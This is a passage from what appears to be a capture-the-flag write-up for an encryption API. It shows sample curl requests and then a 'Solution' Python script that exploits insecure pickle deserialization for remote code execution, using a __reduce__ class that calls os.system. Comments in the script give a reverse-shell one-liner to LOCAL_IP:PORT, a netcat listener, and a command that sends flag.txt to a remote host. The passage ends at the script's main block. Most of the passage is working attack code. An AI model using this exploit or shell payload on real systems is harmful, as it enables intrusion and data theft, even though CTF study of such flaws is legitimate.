+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/encrypt -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;public_key&#34;:&#34;&lt;base64_pubkey&gt;&#34;, &#34;data&#34;:&#34;&lt;base64_data&gt;&#34;, &#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><p>Decrypt Data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST http://localhost:5000/apiv1/decrypt -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Authorization: Bearer &lt;token&gt;&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;encrypted_data&#34;:&#34;&lt;base64_encrypted_data&gt;&#34;, &#34;password&#34;:&#34;password123&#34;}&#39;</span>
+</span></span></code></pre></div><h2 id="solution">Solution</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Hash <span style="color:#f92672">import</span> SHA256
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> PKCS1_OAEP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> utils <span style="color:#f92672">import</span> print_colored
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># To get a reverse shell and get the flag:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># python exp.py --action exploit --payload &#34;python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((\&#34;LOCAL_IP\&#34;,PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&#34;sh\&#34;)&#39;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or to get the flag directly:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># start a netcat listener</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># `nc -lvnp PORT` </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># python exploit.py --action exploit --payload &#34;sh -c &#39;cat flag.txt | LOCAL_IP PORT&#39;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>API_BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://172.17.0.2:5000/apiv1&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>(username, password):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;username&#39;</span>: username, <span style="color:#e6db74">&#39;password&#39;</span>: password}
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/register&#39;</span>, json<span style="color:#f92672">=</span>payload)
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:  
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;token&#39;</span>) 
+</span></span><span style="display:flex;"><span>        hashed <span style="color:#f92672">=</span> SHA256<span style="color:#f92672">.</span>new(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Registration successful using </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">SHA256: </span><span style="color:#e6db74">{</span>hashed<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Token: </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;green&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Full response = </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>json()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Registration failed.&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>json())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(username, password, token):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;username&#39;</span>: username, <span style="color:#e6db74">&#39;password&#39;</span>: password}
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Authorization&#39;</span>: token}
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/login&#39;</span>, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sending to: </span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/login</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">username=</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">token=</span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;token&#39;</span>]
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Login successful. Token: </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;bright_green&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;Login failed.&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_key</span>(token, password, key_file<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, privkeyfile<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> key_file <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        key_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./public_key.pem&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> privkeyfile <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        privkeyfile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./private_key.pem&#39;</span>
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Uploading keys: </span><span style="color:#e6db74">{</span>key_file<span style="color:#e6db74">}</span><span style="color:#e6db74"> and </span><span style="color:#e6db74">{</span>privkeyfile<span style="color:#e6db74">}</span><span style="color:#e6db74">...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bright_yellow&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(key_file, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        key_data <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(privkeyfile, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        data<span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    priv_key_base64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(data)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    key_base64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(key_data)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;public_key&#39;</span>: key_base64,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;private_key&#39;</span>:priv_key_base64, 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;password&#39;</span>:password
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Authorization&#39;</span>: token}
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Uploading keys: </span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/uploadkey...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">key = </span><span style="color:#e6db74">{</span>key_base64<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bright_yellow&#34;</span>)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/uploadkey&#39;</span>, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;Key uploaded successfully.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;bright_green&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>json())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>json())
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Key upload failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>( token,password, data, public_key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> public_key <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        public_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./public_key.pem&#39;</span>
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Initiating the encryption proces...Public Key file = </span><span style="color:#e6db74">{</span>public_key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bright_yellow&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(public_key, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        key_data <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    publicKey <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(key_data)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;data&#39;</span>: data, 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;public_key&#39;</span>: publicKey, 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;password&#39;</span>:password
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Authorization&#39;</span>: token
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/encrypt&#39;</span>, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sending: </span><span style="color:#e6db74">{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74"> to be encrypted using token = </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;yellow&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Response = </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>content<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bright_green&#34;</span>)
+</span></span><span style="display:flex;"><span>        encrypted_data <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;encrypted_data&#39;</span>]
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Encrypted data: </span><span style="color:#e6db74">{</span>encrypted_data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#34;magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> encrypted_data
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print_colored(response<span style="color:#f92672">.</span>content, <span style="color:#e6db74">&#34;red&#34;</span>)
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;Encryption failed.&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(token, encrypted_data, password):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;encrypted_data&#39;</span>: encrypted_data, 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;password&#39;</span>:password
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Authorization&#39;</span>: token}
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/decrypt&#39;</span>, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>        decrypted_data <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#39;decrypted_data&#39;</span>]
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Decrypted data: </span><span style="color:#e6db74">{</span>decrypted_data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;green&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>        print_colored(response<span style="color:#f92672">.</span>json(), <span style="color:#e6db74">&#34;bright_red&#34;</span>)
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;Decryption failed.&#39;</span>, <span style="color:#e6db74">&#34;blue&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_key</span>(name):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> name <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;RSA&#39;</span>
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>generate(<span style="color:#ae81ff">2048</span>)
+</span></span><span style="display:flex;"><span>    private_key <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>export_key()
+</span></span><span style="display:flex;"><span>    public_key <span style="color:#f92672">=</span> key<span style="color:#f92672">.</span>publickey()<span style="color:#f92672">.</span>export_key()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">_private_key.pem&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        file<span style="color:#f92672">.</span>write(private_key)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">_public_key.pem&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>        file<span style="color:#f92672">.</span>write(public_key)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Key pair generated successfully.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">exe</span>(object):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, cmd):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>cmd <span style="color:#f92672">=</span> cmd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (self<span style="color:#f92672">.</span>cmd,))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_random_string</span>(length):
+</span></span><span style="display:flex;"><span>    letters <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_lowercase
+</span></span><span style="display:flex;"><span>    result_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choice(letters) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Random string of length&#34;</span>, length, <span style="color:#e6db74">&#34;is:&#34;</span>, result_str)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result_str
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(payload):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;This function demonstrates how to exploit the API using a reverse shell payload&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user123&#39;</span> <span style="color:#f92672">+</span> get_random_string(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password1&#39;</span>
+</span></span><span style="display:flex;"><span>    public_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./public_key.pem&#39;</span>
+</span></span><span style="display:flex;"><span>    private_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./private_key.pem&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Register a new user</span>
+</span></span><span style="display:flex;"><span>    tokenval <span style="color:#f92672">=</span> register(user, password)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Login as the new user</span>
+</span></span><span style="display:flex;"><span>    login(user, password, tokenval)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Upload key pair</span>
+</span></span><span style="display:flex;"><span>    upload_key(tokenval, password, public_key, private_key)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Craft the payload using pickle</span>
+</span></span><span style="display:flex;"><span>    instance <span style="color:#f92672">=</span> exe(payload)
+</span></span><span style="display:flex;"><span>    malicious_data <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(instance)
+</span></span><span style="display:flex;"><span>    maliciousEncoded <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(malicious_data)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Encrypt the payload</span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Authorization&#39;</span>: tokenval}
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload</span>
+</span></span><span style="display:flex;"><span>    exploit <span style="color:#f92672">=</span> encrypt(tokenval, password, maliciousEncoded, public_key<span style="color:#f92672">=</span>public_key)
+</span></span><span style="display:flex;"><span>    tmpdata <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;testing testing 123&#39;</span>)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sending a test payload </span><span style="color:#e6db74">{</span>tmpdata<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bg_bright_magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># sending tmpdata for encryption</span>
+</span></span><span style="display:flex;"><span>    exp <span style="color:#f92672">=</span> encrypt(tokenval, password, tmpdata, public_key<span style="color:#f92672">=</span>public_key)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># This is where RCE occurs.</span>
+</span></span><span style="display:flex;"><span>    dec <span style="color:#f92672">=</span> decrypt(tokenval, exp, password)
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sending the exploit payload </span><span style="color:#e6db74">{</span>exploit<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bg_bright_magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Encrypted tmpdata </span><span style="color:#e6db74">{</span>exp<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bg_bright_magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>    print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Encrypted Payload = </span><span style="color:#e6db74">{</span>exploit<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;bg_bright_magenta&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Setup payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;encrypted_data&#39;</span>: exploit,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;password&#39;</span>: password,
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>API_BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/decrypt&#39;</span>, json<span style="color:#f92672">=</span>payload, headers<span style="color:#f92672">=</span>headers)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;Exploit executed successfully.&#39;</span>, <span style="color:#e6db74">&#39;green&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>json())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(response<span style="color:#f92672">.</span>json())
+</span></span><span style="display:flex;"><span>        print_colored(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Exploit execution failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
